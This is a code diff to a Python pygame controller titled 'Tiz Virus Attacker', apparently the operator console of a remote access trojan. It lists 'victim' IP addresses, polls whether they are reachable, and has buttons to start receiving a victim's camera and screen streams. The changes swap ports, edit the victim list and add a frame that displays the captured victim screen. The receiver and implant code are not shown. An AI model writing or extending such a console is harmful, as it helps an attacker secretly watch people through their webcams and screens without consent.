@@ -33,10 +33,11 @@ pygame.display.set_caption("Remote Desktop Menu")
 font = pygame.font.Font(None, 36)
 
 # Vector victim origin
-VICTIM_IPS = ['192.168.1.15', '192.168.1.6', '10.0.2.15']
+VICTIM_IPS = ['10.10.27.158', '192.168.1.6', '192.168.1.15']
 
 # Thread pool for background tasks
 thread_pool = ThreadPoolExecutor(max_workers=4)
+
 
 class UIState:
     def __init__(self):
@@ -49,7 +50,9 @@ class UIState:
         self.victims_status = {ip: "Not reachable" for ip in VICTIM_IPS}
         self.running = True
 
+
 ui_state = UIState()
+
 
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
@@ -59,6 +62,7 @@ def parseargs():
     options = cli_args.parse_args(sys.argv[1:])
     options.hosts = VICTIM_IPS
     return options
+
 
 # Create initial displays
 displays = [
@@ -71,6 +75,7 @@ displays = [
 add_button = Display(WIDTH - 100, HEIGHT - 100, 80, 80, "+", font)
 back_button = Display(10, 10, 100, 50, "Back", font)
 
+
 def create_new_display():
     num_displays = len(displays)
     row = num_displays // 3
@@ -78,6 +83,7 @@ def create_new_display():
     x = 50 + col * 250
     y = 50 + row * 200
     return Display(x, y, 200, 150, f"Display {num_displays + 1}", font)
+
 
 def check_single_victim(host, port):
     try:
@@ -89,12 +95,19 @@ def check_single_victim(host, port):
     except socket.error:
         return "Not reachable"
 
+
 def status_checker_thread(options):
     while ui_state.running:
         for host in options.hosts:
             status = check_single_victim(host, options.port)
             ui_state.victims_status[host] = status
         pygame.time.delay(2000)  # Check every 2 seconds
+
+
+def draw_static_frame(surface, frame_rect, border_color=(0, 0, 0), border_width=2):
+    """Vẽ khung tĩnh không thay đổi."""
+    pygame.draw.rect(surface, border_color, frame_rect, border_width)
+
 
 def show_full_screen(display, options):
     full_screen = True
@@ -126,14 +139,14 @@ def show_full_screen(display, options):
                     elif camera_button.rect.collidepoint(event.pos):
                         if camera_button.text == "Start Camera":
                             camera_button.text = "Stop Camera"
-                            camera_receiver = camreceiver(display.text, options.port + 1)
+                            camera_receiver = camreceiver(display.text, options.port + 2)
                         else:
                             camera_button.text = "Start Camera"
                             ui_state.camera_running = False
                     elif screen_button.rect.collidepoint(event.pos):
                         if screen_button.text == "Start Screen":
                             screen_button.text = "Stop Screen"
-                            screen_receiver = screenreceiver(display.text, options.port + 2)
+                            screen_receiver = screenreceiver(display.text, options.port + 1)
                         else:
                             screen_button.text = "Start Screen"
                             if screen_receiver:
@@ -149,8 +162,17 @@ def show_full_screen(display, options):
             input_box.draw(screen)
             text_surface = font.render(f"Full Screen: {display.text}", True, BLACK)
             text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
-            screen.blit(text_surface, text_rect)
+            # Define the frame rectangle
+            frame_rect = pygame.Rect(WIDTH // 2 - 300, HEIGHT // 2 - 225, 600, 300)
 
+            # Vẽ khung tĩnh chỉ một lần
+            draw_static_frame(screen, frame_rect)
+
+            # Cập nhật nội dung bên trong khung
+            if screen_receiver and screen_receiver.double_buffer:
+                screen.blit(screen_receiver.double_buffer, frame_rect)
+            else:
+                screen.blit(text_surface, text_rect)
             camera_button.draw(screen)
             screen_button.draw(screen)
             file_button.draw(screen)
@@ -158,13 +180,14 @@ def show_full_screen(display, options):
 
             pygame.display.flip()
             clock.tick(60)  # Limit to 60 FPS
-            
+
         except pygame.error:
             break
 
     # Cleanup
     if screen_receiver:
         screen_receiver.stop()
+
 
 def main():
     global options
@@ -213,11 +236,11 @@ def main():
             status_button.draw(screen, ui_state.scroll_y)
 
         pygame.display.flip()
-        clock.tick(60)
 
     # Cleanup
     thread_pool.shutdown(wait=False)
     pygame.quit()
+
 
 if __name__ == "__main__":
     main()
